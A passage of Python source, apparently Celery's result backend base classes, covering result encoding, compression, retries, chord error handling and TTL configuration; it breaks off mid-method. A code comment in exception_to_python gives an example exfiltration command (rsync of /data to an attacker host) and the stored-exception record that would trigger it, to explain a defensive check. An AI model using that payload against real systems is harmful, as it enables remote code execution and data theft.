"""Result backend base classes.

- :class:`BaseBackend` defines the interface.

- :class:`KeyValueStoreBackend` is a common base class
    using K/V semantics like _get and _put.
"""
import sys
import time
import warnings
from collections import Counter, deque, namedtuple
from datetime import datetime, timedelta, timezone
from functools import partial
from uuid import UUID
from weakref import WeakValueDictionary

from billiard.einfo import ExceptionInfo
from kombu.compression import compress, decompress
from kombu.compression import encoders as compression_encoders
from kombu.compression import get_encoder as get_compression_encoder
from kombu.serialization import dumps, loads, prepare_accept_content
from kombu.serialization import registry as serializer_registry
from kombu.utils.encoding import bytes_to_str, ensure_bytes
from kombu.utils.url import maybe_sanitize_url

import celery.exceptions
from celery import current_app, group, maybe_signature, states
from celery._state import get_current_task
from celery.app.task import Context
from celery.exceptions import (BackendCleanupError, BackendGetMetaError, BackendStoreError, ChordError,
                               ImproperlyConfigured, NotRegistered, SecurityError, TaskRevokedError,
                               TimeoutError)
from celery.result import GroupResult, ResultBase, ResultSet, allow_join_result, result_from_tuple
from celery.utils.collections import BufferMap
from celery.utils.functional import LRUCache, arity_greater
from celery.utils.log import get_logger
from celery.utils.serialization import (create_exception_cls, ensure_serializable, get_pickleable_exception,
                                        get_pickled_exception, raise_with_context)
from celery.utils.time import get_exponential_backoff_interval

__all__ = (
    'BaseBackend', 'KeyValueStoreBackend', 'DisabledBackend',
    'cleanup_event_t', 'cleanup_report_t',
    'RESULT_CLEANUP_TYPE_RESULT', 'RESULT_CLEANUP_TYPE_GROUP',
    'RESULT_CLEANUP_TYPE_CHORD', 'RESULT_CLEANUP_TYPE_PENDING_REFERENCE',
)

EXCEPTION_ABLE_CODECS = frozenset({'pickle'})

#: Marker prepended to compressed result payloads.
#:
#: Unlike a task message, a stored result has nowhere to keep the
#: ``compression`` header that Kombu uses to tell a consumer how a body was
#: compressed, because backends store the payload as a single opaque value.
#: The compression type therefore travels in-band, in front of the compressed
#: body: ``MAGIC + content-type + b'\0' + body``.
#:
#: The leading NUL byte cannot start the output of any serializer Celery
#: ships with (JSON and YAML are text, pickle starts with an opcode, and
#: msgpack encodes a mapping with a byte in the ``0x80``-``0xdf`` range), so a
#: payload written before compression was turned on is never mistaken for a
#: compressed one.
COMPRESSED_PAYLOAD_MAGIC = b'\x00celery-compressed\x00'

logger = get_logger(__name__)

MESSAGE_BUFFER_MAX = 8192

pending_results_t = namedtuple('pending_results_t', (
    'concrete', 'weak',
))

cleanup_event_t = namedtuple('cleanup_event_t', (
    'key', 'type', 'status', 'reason', 'expired_at', 'deleted_at',
))

cleanup_report_t = namedtuple('cleanup_report_t', (
    'deleted', 'retained', 'scanned', 'skipped', 'cursor', 'events', 'errors',
))

RESULT_CLEANUP_TYPE_RESULT = 'result'
RESULT_CLEANUP_TYPE_GROUP = 'group'
RESULT_CLEANUP_TYPE_CHORD = 'chord'
RESULT_CLEANUP_TYPE_PENDING_REFERENCE = 'pending_reference'

RESULT_CLEANUP_TYPES = frozenset({
    RESULT_CLEANUP_TYPE_RESULT,
    RESULT_CLEANUP_TYPE_GROUP,
    RESULT_CLEANUP_TYPE_CHORD,
    RESULT_CLEANUP_TYPE_PENDING_REFERENCE,
})

TTL_CONFIG_STATES = (
    states.PENDING,
    states.STARTED,
    states.RETRY,
    states.SUCCESS,
    states.FAILURE,
    states.REVOKED,
)

E_NO_BACKEND = """
No result backend is configured.
Please see the documentation for more information.
"""

E_CHORD_NO_BACKEND = """
Starting chords requires a result backend to be configured.

Note that a group chained with a task is also upgraded to be a chord,
as this pattern requires synchronization.

Result backends that supports chords: Redis, Database, Memcached, and more.
"""

E_UNKNOWN_COMPRESSION = """\
Unknown compression method {0!r} configured in result_compression.
Available methods are: {1}.
"""

W_COMPRESSION_UNSUPPORTED = """\
The {0} result backend cannot store compressed payloads, so the
result_compression setting is ignored and results are stored uncompressed.
"""

W_RESULT_TRANSITION_UNSUPPORTED = """\
The {0} result backend cannot atomically compare-and-swap result versions.
Result writes use the legacy read/write fallback, so configure a backend with
atomic transitions for safe cleanup and retry races.
"""


def compress_payload(payload, compression):
    """Compress an encoded result payload.

    The returned payload describes its own compression method, so
    :func:`decompress_payload` can undo this without being told which
    method was used.

    Arguments:
        payload (AnyStr): An encoded result payload.
        compression (str): Name of a method in the Kombu compression
            registry, for example ``'gzip'``.
    """
    body, content_type = compress(payload, compression)
    return b''.join([
        COMPRESSED_PAYLOAD_MAGIC, content_type.encode('utf-8'), b'\x00', body,
    ])


def decompress_payload(payload):
    """Decompress a payload written by :func:`compress_payload`.

    Payloads that don't carry the marker are returned as they are, so
    results stored before compression was enabled are still readable, and
    payloads that do carry it are decompressed even when the reader has no
    compression of its own configured.
    """
    if isinstance(payload, memoryview):
        payload = payload.tobytes()
    if not isinstance(payload, (bytes, bytearray)):
        return payload
    if not payload.startswith(COMPRESSED_PAYLOAD_MAGIC):
        return payload
    content_type, _, body = payload[
        len(COMPRESSED_PAYLOAD_MAGIC):].partition(b'\x00')
    return decompress(body, content_type.decode('utf-8'))


def unpickle_backend(cls, args, kwargs):
    """Return an unpickled backend."""
    return cls(*args, app=current_app._get_current_object(), **kwargs)


def _create_chord_error_with_cause(message, original_exc=None) -> ChordError:
    """Create a ChordError preserving the original exception as __cause__.

    This helper reduces code duplication across the codebase when creating
    ChordError instances that need to preserve the original exception.
    """
    chord_error = ChordError(message)
    if isinstance(original_exc, Exception):
        chord_error.__cause__ = original_exc
    return chord_error


def _create_fake_task_request(task_id, errbacks=None, task_name='unknown', **extra) -> Context:
    """Create a fake task request context for error callbacks.

    This helper reduces code duplication when creating fake request contexts
    for error callback handling.
    """
    return Context({
        "id": task_id,
        "errbacks": errbacks or [],
        "delivery_info": dict(),
        "task": task_name,
        **extra
    })


class _nulldict(dict):
    def ignore(self, *a, **kw):
        pass

    __setitem__ = update = setdefault = ignore


def _is_request_ignore_result(request):
    if request is None:
        return False
    return getattr(request, 'ignore_result', False)


class Backend:
    READY_STATES = states.READY_STATES
    UNREADY_STATES = states.UNREADY_STATES
    EXCEPTION_STATES = states.EXCEPTION_STATES

    TimeoutError = TimeoutError

    #: Time to sleep between polling each individual item
    #: in `ResultSet.iterate`. as opposed to the `interval`
    #: argument which is for each pass.
    subpolling_interval = None

    #: If true the backend must implement :meth:`get_many`.
    supports_native_join = False

    #: If true the backend must automatically expire results.
    #: The daily backend_cleanup periodic task won't be triggered
    #: in this case.
    supports_autoexpire = False

    #: Set to true if the backend is persistent by default.
    persistent = True

    #: If true the backend can store a result payload that has been
    #: compressed, which means storing and returning arbitrary bytes
    #: unchanged.  Backends that put the payload inside a JSON document, or
    #: that decode it to text on the way out, can't, and the
    #: :setting:`result_compression` setting is ignored for them.
    supports_result_compression = False

    #: True when cleanup can enumerate stored result records.
    supports_result_cleanup_scan = False

    #: True when cleanup can conditionally delete based on record version.
    supports_atomic_result_cleanup = False

    #: True when writes can conditionally update based on record version.
    supports_atomic_result_transitions = False

    #: True when group/chord records can receive a native per-record TTL.
    supports_native_group_ttl = False

    retry_policy = {
        'max_retries': 20,
        'interval_start': 0,
        'interval_step': 1,
        'interval_max': 1,
    }

    def __init__(self, app,
                 serializer=None, max_cached_results=None, accept=None,
                 expires=None, expires_type=None, url=None, **kwargs):
        self.app = app
        conf = self.app.conf
        self.serializer = serializer or conf.result_serializer
        (self.content_type,
         self.content_encoding,
         self.encoder) = serializer_registry._encoders[self.serializer]
        self.compression = self.prepare_compression(
            conf.get('result_compression'))
        cmax = max_cached_results or conf.result_cache_max
        self._cache = _nulldict() if cmax == -1 else LRUCache(limit=cmax)

        legacy_expires = self.prepare_expires(expires, expires_type)
        self.expires = legacy_expires
        configured_result_ttl = kwargs.pop('result_ttl', None)
        self.result_ttl = self.prepare_result_ttl(
            configured_result_ttl,
            fallback=legacy_expires,
        )
        if configured_result_ttl is not None and not self.supports_atomic_result_transitions:
            warnings.warn(
                W_RESULT_TRANSITION_UNSUPPORTED.format(type(self).__name__),
                UserWarning,
            )
        self.result_cleanup_batch_size = self.prepare_cleanup_batch_size(
            kwargs.pop('result_cleanup_batch_size', None))

        # precedence: accept, conf.result_accept_content, conf.accept_content
        self.accept = conf.result_accept_content if accept is None else accept
        self.accept = conf.accept_content if self.accept is None else self.accept
        self.accept = prepare_accept_content(self.accept)

        self.always_retry = conf.get('result_backend_always_retry', False)
        self.max_sleep_between_retries_ms = conf.get('result_backend_max_sleep_between_retries_ms', 10000)
        self.base_sleep_between_retries_ms = conf.get('result_backend_base_sleep_between_retries_ms', 10)
        self.max_retries = conf.get('result_backend_max_retries', float("inf"))
        self.thread_safe = conf.get('result_backend_thread_safe', False)

        self._pending_results = pending_results_t({}, WeakValueDictionary())
        self._pending_messages = BufferMap(MESSAGE_BUFFER_MAX)
        self.url = url

    def as_uri(self, include_password=False):
        """Return the backend as an URI, sanitizing the password or not."""
        # when using maybe_sanitize_url(), "/" is added
        # we're stripping it for consistency
        if include_password:
            return self.url
        url = maybe_sanitize_url(self.url or '')
        return url[:-1] if url.endswith(':///') else url

    def mark_as_started(self, task_id, **meta):
        """Mark a task as started."""
        return self.store_result(task_id, meta, states.STARTED)

    def mark_as_done(self, task_id, result,
                     request=None, store_result=True, state=states.SUCCESS):
        """Mark task as successfully executed."""
        if (store_result and not _is_request_ignore_result(request)):
            self.store_result(task_id, result, state, request=request)
        if request and request.chord:
            self.on_chord_part_return(request, state, result)

    def mark_as_failure(self, task_id, exc,
                        traceback=None, request=None,
                        store_result=True, call_errbacks=True,
                        state=states.FAILURE):
        """Mark task as executed with failure."""
        if store_result:
            self.store_result(task_id, exc, state,
                              traceback=traceback, request=request)
        if request:
            # This task may be part of a chord
            if request.chord:
                self.on_chord_part_return(request, state, exc)
            # It might also have chained tasks which need to be propagated to,
            # this is most likely to be exclusive with being a direct part of a
            # chord but we'll handle both cases separately.
            #
            # The `chain_data` try block here is a bit tortured since we might
            # have non-iterable objects here in tests and it's easier this way.
            try:
                chain_data = iter(request.chain)
            except (AttributeError, TypeError):
                chain_data = tuple()
            chain_elems = deque(chain_data)
            while chain_elems:
                chain_elem = chain_elems.popleft()
                # Reconstruct a `Context` object for the chained task which has
                # enough information to for backends to work with
                chain_elem_ctx = Context(chain_elem)
                chain_elem_ctx.update(chain_elem_ctx.options)
                chain_elem_ctx.id = chain_elem_ctx.options.get('task_id')
                chain_elem_ctx.group = chain_elem_ctx.options.get('group_id')
                # If the state should be propagated, we'll do so for all
                # elements of the chain. This is only truly important so
                # that the last chain element which controls completion of
                # the chain itself is marked as completed to avoid stalls.
                #
                # Some chained elements may be complex signatures and have no
                # task ID of their own, so we skip them hoping that not
                # descending through them is OK. If the last chain element is
                # complex, we assume it must have been uplifted to a chord by
                # the canvas code and therefore the condition below will ensure
                # that we mark something as being complete as avoid stalling.
                if (
                    store_result and state in states.PROPAGATE_STATES and
                    chain_elem_ctx.id is not None
                ):
                    self.store_result(
                        chain_elem_ctx.id, exc, state,
                        traceback=traceback, request=chain_elem_ctx,
                    )
                # If the chain element is a member of a chord, we also need
                # to call `on_chord_part_return()` as well to avoid stalls.
                if 'chord' in chain_elem_ctx.options:
                    self.on_chord_part_return(chain_elem_ctx, state, exc)
                # A chord step completes only when its body does, so the
                # result that later steps and any enclosing chord wait on is
                # the chord body, not the chord's own id. Descend into it so
                # the failure reaches that result (see issue #9674).
                if getattr(chain_elem_ctx, 'subtask_type', None) == 'chord':
                    chord_body = (chain_elem_ctx.kwargs or {}).get('body')
                    if chord_body is not None:
                        chain_elems.append(chord_body)
            # And finally we'll fire any errbacks
            if call_errbacks and request.errbacks:
                self._call_task_errbacks(request, exc, traceback)

    def _call_task_errbacks(self, request, exc, traceback):
        old_signature = []
        for errback in request.errbacks:
            errback = self.app.signature(errback)
            if not errback._app:
                # Ensure all signatures have an application
                errback._app = self.app
            try:
                if (
                        # Celery tasks type created with the @task decorator have
                        # the __header__ property, but Celery task created from
                        # Task class do not have this property.
                        # That's why we have to check if this property exists
                        # before checking is it partial function.
                        hasattr(errback.type, '__header__') and

                        # workaround to support tasks with bind=True executed as
                        # link errors. Otherwise, retries can't be used
                        not isinstance(errback.type.__header__, partial) and
                        arity_greater(errback.type.__header__, 1)
                ):
                    try:
                        errback(request, exc, traceback)
                    except Exception:
                        logger.exception(
                            'Errback %r raised an exception',
                            errback.name,
                        )
                else:
                    old_signature.append(errback)
            except NotRegistered:
                # Task may not be present in this worker.
                # We simply send it forward for another worker to consume.
                # If the task is not registered there, the worker will raise
                # NotRegistered.
                old_signature.append(errback)

        if old_signature:
            # Previously errback was called as a task so we still
            # need to do so if the errback only takes a single task_id arg.
            task_id = request.id
            root_id = request.root_id or task_id
            g = group(old_signature, app=self.app)
            if self.app.conf.task_always_eager or request.delivery_info.get('is_eager', False):
                g.apply(
                    (task_id,), parent_id=task_id, root_id=root_id
                )
            else:
                g.apply_async(
                    (task_id,), parent_id=task_id, root_id=root_id
                )

    def mark_as_revoked(self, task_id, reason='',
                        request=None, store_result=True, state=states.REVOKED):
        exc = TaskRevokedError(reason)
        if store_result:
            self.store_result(task_id, exc, state,
                              traceback=None, request=request)
        if request and request.chord:
            self.on_chord_part_return(request, state, exc)

    def mark_as_retry(self, task_id, exc, traceback=None,
                      request=None, store_result=True, state=states.RETRY):
        """Mark task as being retries.

        Note:
            Stores the current exception (if any).
        """
        return self.store_result(task_id, exc, state,
                                 traceback=traceback, request=request)

    def chord_error_from_stack(self, callback, exc=None):
        app = self.app

        try:
            backend = app._tasks[callback.task].backend
        except KeyError:
            backend = self

        # Handle group callbacks specially to prevent hanging body tasks
        if isinstance(callback, group):
            return self._handle_group_chord_error(group_callback=callback, backend=backend, exc=exc)

        # Generate an ID if missing so the error can be stored.
        callback_id = callback.id
        if not callback_id:
            from kombu.utils.uuid import uuid
            callback_id = callback.options['task_id'] = uuid()

        # We have to make a fake request since either the callback failed or
        # we're pretending it did since we don't have information about the
        # chord part(s) which failed. This request is constructed as a best
        # effort for new style errbacks and may be slightly misleading about
        # what really went wrong, but at least we call them!
        fake_request = _create_fake_task_request(
            task_id=callback.options.get("task_id"),
            errbacks=callback.options.get("link_error", []),
            **callback
        )
        try:
            self._call_task_errbacks(fake_request, exc, None)
        except Exception as eb_exc:  # pylint: disable=broad-except
            return backend.fail_from_current_stack(callback_id, exc=eb_exc)
        else:
            return backend.fail_from_current_stack(callback_id, exc=exc)

    def _handle_group_chord_error(self, group_callback, backend, exc=None):
        """Handle chord errors when the callback is a group.

        When a chord header fails and the body is a group, we need to:
        1. Revoke all pending tasks in the group body
        2. Mark them as failed with the chord error
        3. Call error callbacks for each task

        This prevents the group body tasks from hanging indefinitely (#8786)
        """

        # Extract original exception from ChordError if available
        if isinstance(exc, ChordError) and hasattr(exc, '__cause__') and exc.__cause__:
            original_exc = exc.__cause__
        else:
            original_exc = exc

        try:
            # Freeze the group to get the actual GroupResult with task IDs
            frozen_group = group_callback.freeze()

            if isinstance(frozen_group, GroupResult):
                # revoke all tasks in the group to prevent execution
                frozen_group.revoke()

                # Handle each task in the group individually
                for result in frozen_group.results:
                    try:
                        # Create fake request for error callbacks
                        fake_request = _create_fake_task_request(
                            task_id=result.id,
                            errbacks=group_callback.options.get("link_error", []),
                            task_name=getattr(result, 'task', 'unknown')
                        )

                        # Call error callbacks for this task with original exception
                        try:
                            backend._call_task_errbacks(fake_request, original_exc, None)
                        except Exception:  # pylint: disable=broad-except
                            # continue on exception to be sure to iter to all the group tasks
                            pass

                        # Mark the individual task as failed with original exception
                        backend.fail_from_current_stack(result.id, exc=original_exc)

                    except Exception as task_exc:  # pylint: disable=broad-except
                        # Log error but continue with other tasks
                        logger.exception(
                            'Failed to handle chord error for task %s: %r',
                            getattr(result, 'id', 'unknown'), task_exc
                        )

                # Also mark the group itself as failed if it has an ID
                frozen_group_id = getattr(frozen_group, 'id', None)
                if frozen_group_id:
                    backend.mark_as_failure(frozen_group_id, original_exc)

            return None

        except Exception as cleanup_exc:  # pylint: disable=broad-except
            # Log the error and fall back to single task handling
            logger.exception(
                'Failed to handle group chord error, falling back to single task handling: %r',
                cleanup_exc
            )
            # Fallback to original error handling
            return backend.fail_from_current_stack(group_callback.id, exc=exc)

    def fail_from_current_stack(self, task_id, exc=None):
        type_, real_exc, tb = sys.exc_info()
        try:
            exc = real_exc if exc is None else exc
            exception_info = ExceptionInfo((type_, exc, tb))
            self.mark_as_failure(task_id, exc, exception_info.traceback)
            return exception_info
        finally:
            while tb is not None:
                try:
                    tb.tb_frame.clear()
                    tb.tb_frame.f_locals
                except RuntimeError:
                    # Ignore the exception raised if the frame is still executing.
                    pass
                tb = tb.tb_next

            del tb

    def prepare_exception(self, exc, serializer=None):
        """Prepare exception for serialization."""
        serializer = self.serializer if serializer is None else serializer
        if serializer in EXCEPTION_ABLE_CODECS:
            return get_pickleable_exception(exc)
        exctype = type(exc)
        return {'exc_type': getattr(exctype, '__qualname__', exctype.__name__),
                'exc_message': ensure_serializable(exc.args, self.encode),
                'exc_module': exctype.__module__}

    def exception_to_python(self, exc):
        """Convert serialized exception to Python exception."""
        if not exc:
            return None
        elif isinstance(exc, BaseException):
            if self.serializer in EXCEPTION_ABLE_CODECS:
                exc = get_pickled_exception(exc)
            return exc
        elif not isinstance(exc, dict):
            try:
                exc = dict(exc)
            except TypeError as e:
                raise TypeError(f"If the stored exception isn't an "
                                f"instance of "
                                f"BaseException, it must be a dictionary.\n"
                                f"Instead got: {exc}") from e

        exc_module = exc.get('exc_module')
        try:
            exc_type = exc['exc_type']
        except KeyError as e:
            raise ValueError("Exception information must include "
                             "the exception type") from e
        if exc_module is None:
            cls = create_exception_cls(
                exc_type, __name__)
        else:
            try:
                # Load module and find exception class in that
                cls = sys.modules[exc_module]
                # The type can contain qualified name with parent classes
                for name in exc_type.split('.'):
                    cls = getattr(cls, name)
            except (KeyError, AttributeError):
                cls = create_exception_cls(exc_type,
                                           celery.exceptions.__name__)
        exc_msg = exc.get('exc_message', '')

        # If the recreated exception type isn't indeed an exception,
        # this is a security issue. Without the condition below, an attacker
        # could exploit a stored command vulnerability to execute arbitrary
        # python code such as:
        # os.system("rsync /data attacker@192.168.56.100:~/data")
        # The attacker sets the task's result to a failure in the result
        # backend with the os as the module, the system function as the
        # exception type and the payload
        # rsync /data attacker@192.168.56.100:~/data
        # as the exception arguments like so:
        # {
        #   "exc_module": "os",
        #   "exc_type": "system",
        #   "exc_message": "rsync /data attacker@192.168.56.100:~/data"
        # }
        if not isinstance(cls, type) or not issubclass(cls, BaseException):
            fake_exc_type = exc_type if exc_module is None else f'{exc_module}.{exc_type}'
            raise SecurityError(
                f"Expected an exception class, got {fake_exc_type} with payload {exc_msg}")

        # XXX: Without verifying `cls` is actually an exception class,
        #      an attacker could execute arbitrary python code.
        #      cls could be anything, even eval().
        try:
            if isinstance(exc_msg, (tuple, list)):
                exc = cls(*exc_msg)
            else:
                exc = cls(exc_msg)
        except Exception as err:  # noqa
            exc = Exception(f'{cls}({exc_msg})')

        return exc

    def prepare_value(self, result):
        """Prepare value for storage."""
        if self.serializer != 'pickle' and isinstance(result, ResultBase):
            return result.as_tuple()
        return result

    def encode(self, data):
        _, _, payload = self._encode(data)
        if self.compression:
            payload = compress_payload(payload, self.compression)
        return payload

    def _encode(self, data):
        return dumps(data, serializer=self.serializer)

    def meta_from_decoded(self, meta):
        if meta['status'] in self.EXCEPTION_STATES:
            meta['result'] = self.exception_to_python(meta['result'])
        return meta

    def decode_result(self, payload):
        return self.meta_from_decoded(self.decode(payload))

    def decode(self, payload):
        if payload is None:
            return payload
        payload = payload or str(payload)
        # Driven by the payload itself rather than by ``self.compression`` so
        # that a result stays readable after the setting is turned off again,
        # and so that a reader that never had it turned on can still read a
        # result written by a worker that did.
        payload = decompress_payload(payload)
        return loads(payload,
                     content_type=self.content_type,
                     content_encoding=self.content_encoding,
                     accept=self.accept)

    def prepare_compression(self, compression):
        """Return the compression method to encode results with.

        Returns :const:`None` when results should be stored uncompressed,
        either because nothing was configured or because this backend can't
        hold a compressed payload.
        """
        if not compression:
            return None
        if not self.supports_result_compression:
            warnings.warn(
                W_COMPRESSION_UNSUPPORTED.format(type(self).__name__),
                UserWarning,
            )
            return None
        try:
            get_compression_encoder(compression)
        except KeyError as e:
            raise ImproperlyConfigured(E_UNKNOWN_COMPRESSION.format(
                compression,
                ', '.join(sorted(compression_encoders())))) from e
        return compression

    def prepare_expires(self, value, type=None):
        if value is None:
            value = self.app.conf.result_expires
        if isinstance(value, timedelta):
            value = value.total_seconds()
        if value is not None and type:
            return type(value)
        return value

    def _ttl_seconds(self, value):
        if value is None:
            return None
        if isinstance(value, timedelta):
            value = value.total_seconds()
        try:
            value = float(value)
        except (TypeError, ValueError) as exc:
            raise ImproperlyConfigured(
                f'Result TTL must be a number or timedelta, got {value!r}.'
            ) from exc
        if value < 0:
            raise ImproperlyConfigured('Result TTL cannot be negative.')
        return value if value > 0 else None

    def prepare_result_ttl(self, value=None, fallback=None):
        """Return normalized TTL configuration for states and record types."""
        if value is None:
            value = self.app.conf.get('result_ttl', None)
        fallback = self._ttl_seconds(fallback)
        if value is None:
            configured = {}
        elif isinstance(value, timedelta) or not isinstance(value, dict):
            configured = {'default': value}
        else:
            configured = dict(value)

        default = self._ttl_seconds(
            configured.pop('default', configured.pop('result', fallback)))
        group = self._ttl_seconds(configured.pop('group', default))
        chord = self._ttl_seconds(configured.pop('chord', default))
        pending_reference = self._ttl_seconds(
            configured.pop('pending_reference', configured.pop(
                'pending_references', default)))
        ignore_result = self._ttl_seconds(
            configured.pop('ignore_result', default))

        states_ttl = {}
        for state in TTL_CONFIG_STATES:
            state_value = configured.get(state, configured.get(state.lower()))
            states_ttl[state] = self._ttl_seconds(state_value) if state_value is not None else default

        known = {'default', 'result', 'group', 'chord', 'pending_reference',
                 'pending_references', 'ignore_result'}
        known.update(TTL_CONFIG_STATES)
        known.update(state.lower() for state in TTL_CONFIG_STATES)
        unknown = sorted(set(configured) - known)
        if unknown:
            raise ImproperlyConfigured(
                'Unknown result TTL keys: ' + ', '.join(unknown) + '.')

        return {
            'default': default,
            'states': states_ttl,
            'ignore_result': ignore_result,
            RESULT_CLEANUP_TYPE_GROUP: group,
            RESULT_CLEANUP_TYPE_CHORD: chord,
            RESULT_CLEANUP_TYPE_PENDING_REFERENCE: pending_reference,
        }

    def prepare_cleanup_batch_size(self, value=None):
        if value is None:
            value = self.app.conf.get('result_cleanup_batch_size', 500)
        try:
            value = int(value)
        except (TypeError, ValueError) as exc:
            raise ImproperlyConfigured(
                f'Result cleanup batch size must be an integer, got {value!r}.'
            ) from exc
        if value < 1:
            raise ImproperlyConfigured('Result cleanup batch size must be positive.')
        return value

    def result_ttl_for(self, state=None, record_type=RESULT_CLEANUP_TYPE_RESULT,
                       ignore_result=False):
        if record_type == RESULT_CLEANUP_TYPE_PENDING_REFERENCE:
            return self.result_ttl[record_type]
        if record_type in (RESULT_CLEANUP_TYPE_GROUP, RESULT_CLEANUP_TYPE_CHORD):
            return self.result_ttl[record_type]
        if ignore_result:
            return self.result_ttl['ignore_result']
        return self.result_ttl['states'].get(state, self.result_ttl['default'])

    def prepare_persistent(self, enabled=None):
        if enabled is not None:
            return enabled
        persistent = self.app.conf.result_persistent
        return self.persistent if persistent is None else persistent

    def encode_result(self, result, state):
        if state in self.EXCEPTION_STATES and isinstance(result, BaseException):
            return self.prepare_exception(result)
        return self.prepare_value(result)

    def is_cached(self, task_id):
        return task_id in self._cache

    def _get_result_meta(self, result,
                         state, traceback, request, format_date=True,
                         encode=False, current_meta=None):
        now = self.app.now()
        timestamp = now.isoformat()
        if state in self.READY_STATES:
            date_done = now
            if format_date:
                date_done = date_done.isoformat()
        else:
            date_done = None

        current_meta = current_meta or {}
        date_created = (
            current_meta.get('date_created')
            or current_meta.get('date_updated')
            or current_meta.get('date_done')
            or timestamp
        )
        version = int(current_meta.get('version') or 0) + 1

        meta = {
            'status': state,
            'result': result,
            'traceback': traceback,
            'children': self.current_task_children(request),
            'date_done': date_done,
            'date_created': date_created,
            'date_updated': timestamp,
            'version': version,
            'ignore_result': bool(_is_request_ignore_result(request)),
        }

        if request and getattr(request, 'group', None):
            meta['group_id'] = request.group
        if request and getattr(request, 'parent_id', None):
            meta['parent_id'] = request.parent_id

        if self.app.conf.find_value_for_key('extended', 'result'):
            if request:
                request_meta = {
                    'name': getattr(request, 'task', None),
                    'args': getattr(request, 'args', None),
                    'kwargs': getattr(request, 'kwargs', None),
                    'worker': getattr(request, 'hostname', None),
                    'retries': getattr(request, 'retries', None),
                    'queue': request.delivery_info.get('routing_key')
                    if hasattr(request, 'delivery_info') and
                    request.delivery_info else None,
                }
                if getattr(request, 'stamps', None):
                    request_meta['stamped_headers'] = request.stamped_headers
                    request_meta.update(request.stamps)

                if encode:
                    # args and kwargs need to be encoded properly before saving
                    encode_needed_fields = {"args", "kwargs"}
                    for field in encode_needed_fields:
                        value = request_meta[field]
                        encoded_value = self.encode(value)
                        request_meta[field] = ensure_bytes(encoded_value)

                meta.update(request_meta)

        return meta

    def _sleep(self, amount):
        time.sleep(amount)

    def _ensure_retryable(self, func, *args, fallback_exc=None, fallback_msg=None, **kwargs):
        """Helper to execute a function with the backend's retry policy."""
        retries = 0
        while True:
            try:
                return func(*args, **kwargs)
            except Exception as exc:
                if self.always_retry and self.exception_safe_to_retry(exc):
                    if retries < self.max_retries:
                        retries += 1
                        logger.warning(
                            'Failed operation %s. Retrying %s more times.',
                            getattr(func, '__name__', repr(func)), self.max_retries - retries,
                            exc_info=True)
                        try:
                            self.on_backend_retryable_error(exc)
                        except Exception:
                            logger.exception(
                                "on_backend_retryable_error hook failed; continuing retry loop",
                            )

                        # get_exponential_backoff_interval computes integers
                        # and time.sleep accept floats for sub second sleep
                        sleep_amount = get_exponential_backoff_interval(
                            self.base_sleep_between_retries_ms, retries,
                            self.max_sleep_between_retries_ms, True) / 1000
                        self._sleep(sleep_amount)
                    else:
                        if fallback_exc:
                            exc_kwargs = {}
                            for key in ("task_id", "state"):
                                if key in kwargs:
                                    exc_kwargs[key] = kwargs[key]
                            raise_with_context(fallback_exc(fallback_msg, **exc_kwargs))
                        raise
                else:
                    raise

    def store_result(self, task_id, result, state,
                     traceback=None, request=None, **kwargs):
        """Update task state and result.

        if always_retry_backend_operation is activated, in the event of a recoverable exception,
        then retry operation with an exponential backoff until a limit has been reached.
        """
        result = self.encode_result(result, state)

        kwargs.update({'task_id': task_id, 'state': state})

        self._ensure_retryable(
            self._store_result,
            fallback_exc=BackendStoreError,
            fallback_msg="failed to store result on the backend",
            result=result,
            traceback=traceback,
            request=request,
            **kwargs
        )
        return result

    def forget(self, task_id):
        self._cache.pop(task_id, None)
        self._ensure_retryable(self._forget, task_id=task_id)

    def _forget(self, task_id):
        raise NotImplementedError('backend does not implement forget.')

    def get_state(self, task_id):
        """Get the state of a task."""
        return self.get_task_meta(task_id)['status']

    get_status = get_state  # XXX compat

    def get_traceback(self, task_id):
        """Get the traceback for a failed task."""
        return self.get_task_meta(task_id).get('traceback')

    def get_result(self, task_id):
        """Get the result of a task."""
        return self.get_task_meta(task_id).get('result')

    def get_children(self, task_id):
        """Get the list of subtasks sent by a task."""
        try:
            return self.get_task_meta(task_id)['children']
        except KeyError:
            pass

    def _ensure_not_eager(self):
        if self.app.conf.task_always_eager and not self.app.conf.task_store_eager_result:
            warnings.warn(
                "Results are not stored in backend and should not be retrieved when "
                "task_always_eager is enabled, unless task_store_eager_result is enabled.",
                RuntimeWarning,
                stacklevel=2,
            )

    def exception_safe_to_retry(self, exc):
        """Check if an exception is safe to retry.

        Backends have to overload this method with correct predicates dealing with their exceptions.

        By default no exception is safe to retry, it's up to backend implementation
        to define which exceptions are safe.
        """
        return False

    def on_backend_retryable_error(self, exc):
        """Hook called before retrying a recoverable backend exception."""
        return None

    def get_task_meta(self, task_id, cache=True):
        """Get task meta from backend.

        if always_retry_backend_operation is activated, in the event of a recoverable exception,
        then retry operation with an exponential backoff until a limit has been reached.
        """
        self._ensure_not_eager()
        if cache:
            try:
                return self._cache[task_id]
            except KeyError:
                pass

        meta = self._ensure_retryable(
            self._get_task_meta_for,
            fallback_exc=BackendGetMetaError,
            fallback_msg="failed to get meta",
            task_id=task_id
        )

        if cache and meta.get('status') == states.SUCCESS:
            self._cache[task_id] = meta
        return meta

    def reload_task_result(self, task_id):
        """Reload task result, even if it has been previously fetched."""
        self._cache[task_id] = self.get_task_meta(task_id, cache=False)

    def task_result_exists(self, task_id):
        """Check if a result exists in the backend for the given task ID.

        .. versionadded:: 5.7.0

        Returns:
            bool: :const:`True` if the backend has a result for the task,
                :const:`False` otherwise.
        """
        return self._get_task_meta_for(task_id)["status"] != states.PENDING

    def reload_group_result(self, group_id):
        """Reload group result, even if it has been previously fetched."""
        self._cache[group_id] = self.get_group_meta(group_id, cache=False)

    def get_group_meta(self, group_id, cache=True):
        self._ensure_not_eager()
        if cache:
            try:
                return self._cache[group_id]
            except KeyError:
                pass

        meta = self._ensure_retryable(self._restore_group, group_id=group_id)
        if cache and meta is not None:
            self._cache[group_id] = meta
        return meta

    def restore_group(self, group_id, cache=True):
        """Get the result for a group."""
        meta = self.get_group_meta(group_id, cache=cache)
        if meta:
            return meta['result']

    def save_group(self, group_id, result):
        """Store the result of an executed group."""
        return self._ensure_retryable(
            self._save_group,
            group_id=group_id,
            result=result
        )

    def delete_group(self, group_id):
        self._cache.pop(group_id, None)
        return self._ensure_retryable(self._delete_group, group_id=group_id)

    def _cleanup_now(self):
        return datetime.now(timezone.utc)

    def _cleanup_datetime(self, value):
        if not value:
            return None
        if isinstance(value, datetime):
            parsed = value
        else:
            try:
                parsed = datetime.fromisoformat(str(value))
            except ValueError:
                return None
        if parsed.tzinfo is None:
            return parsed.replace(tzinfo=timezone.utc)
